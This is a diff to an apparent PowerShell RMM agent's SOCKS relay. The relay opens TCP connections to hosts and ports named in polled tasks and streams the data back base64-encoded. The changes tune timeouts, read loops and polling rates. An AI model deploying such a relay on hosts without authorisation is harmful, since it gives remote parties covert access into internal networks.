@@ -647,6 +647,33 @@ function Stop-RmmSocksRelay {
     $script:RmmSocksEnabled = $false
 }
 
+function Read-RmmSocksTcpChunk {
+    param(
+        [System.Net.Sockets.TcpClient]$Tcp,
+        [int]$ReadTimeoutMs = 150
+    )
+    if (-not $Tcp) { return $null }
+    try {
+        $stream = $Tcp.GetStream()
+        $stream.ReadTimeout = $ReadTimeoutMs
+        $buf = New-Object byte[] 16384
+        $n = $stream.Read($buf, 0, $buf.Length)
+        if ($n -le 0) { return @{ eof = $true } }
+        return @{ eof = $false; bytes = $buf; length = $n }
+    } catch [System.IO.IOException] {
+        $inner = $_.Exception.InnerException
+        if ($inner -is [System.Net.Sockets.SocketException]) {
+            if ($inner.SocketErrorCode -eq [System.Net.Sockets.SocketError]::TimedOut) {
+                return @{ eof = $false; timeout = $true }
+            }
+        }
+        if ($_.Exception.Message -match 'timed out|time-out|Timeout') {
+            return @{ eof = $false; timeout = $true }
+        }
+        throw
+    }
+}
+
 function Invoke-RmmSocksCycle {
     param([hashtable]$Headers)
     if (-not $script:RmmSocksEnabled) { return $false }
@@ -670,16 +697,13 @@ function Invoke-RmmSocksCycle {
             $destHost = [string]$task.host
             $port = [int]$task.port
             if ($script:RmmSocksConnections.ContainsKey($tid)) {
-                $existing = $script:RmmSocksConnections[$tid]
-                if ($existing -and $existing.Connected) {
-                    [void]$responses.Add(@{ id = $tid; op = 'ok' })
-                    continue
-                }
+                [void]$responses.Add(@{ id = $tid; op = 'ok' })
+                continue
             }
             try {
                 $tcp = New-Object System.Net.Sockets.TcpClient
-                $tcp.ReceiveTimeout = 5000
-                $tcp.SendTimeout = 5000
+                $tcp.ReceiveTimeout = 0
+                $tcp.SendTimeout = 60000
                 $connectMs = 20000
                 $iar = $tcp.BeginConnect($destHost, $port, $null, $null)
                 if (-not $iar.AsyncWaitHandle.WaitOne($connectMs, $false)) {
@@ -720,23 +744,22 @@ function Invoke-RmmSocksCycle {
         $tcp = $script:RmmSocksConnections[$tid]
         if (-not $tcp) { continue }
         try {
-            if (-not $tcp.Connected) {
+            $closed = $false
+            while ($true) {
+                $chunk = Read-RmmSocksTcpChunk -Tcp $tcp -ReadTimeoutMs 150
+                if ($null -eq $chunk) { break }
+                if ($chunk.timeout) { break }
+                if ($chunk.eof) {
+                    $closed = $true
+                    break
+                }
+                $b64 = [Convert]::ToBase64String($chunk.bytes, 0, $chunk.length)
+                [void]$responses.Add(@{ id = $tid; op = 'data'; data_b64 = $b64 })
+            }
+            if ($closed) {
+                try { $tcp.Close() } catch { }
                 $script:RmmSocksConnections.Remove($tid) | Out-Null
                 [void]$responses.Add(@{ id = $tid; op = 'closed' })
-                continue
-            }
-            $stream = $tcp.GetStream()
-            if ($stream.DataAvailable) {
-                $buf = New-Object byte[] 16384
-                $n = $stream.Read($buf, 0, $buf.Length)
-                if ($n -le 0) {
-                    $tcp.Close()
-                    $script:RmmSocksConnections.Remove($tid) | Out-Null
-                    [void]$responses.Add(@{ id = $tid; op = 'closed' })
-                } else {
-                    $chunk = [Convert]::ToBase64String($buf, 0, $n)
-                    [void]$responses.Add(@{ id = $tid; op = 'data'; data_b64 = $chunk })
-                }
             }
         } catch {
             try { $tcp.Close() } catch { }
@@ -759,8 +782,8 @@ function Invoke-RmmSocksCycle {
 function Invoke-RmmSocksPollBurst {
     param(
         [hashtable]$Headers,
-        [int]$Rounds = 12,
-        [int]$DelayMs = 200
+        [int]$Rounds = 20,
+        [int]$DelayMs = 100
     )
     if (-not $script:RmmSocksEnabled) { return }
     for ($i = 0; $i -lt $Rounds; $i++) {
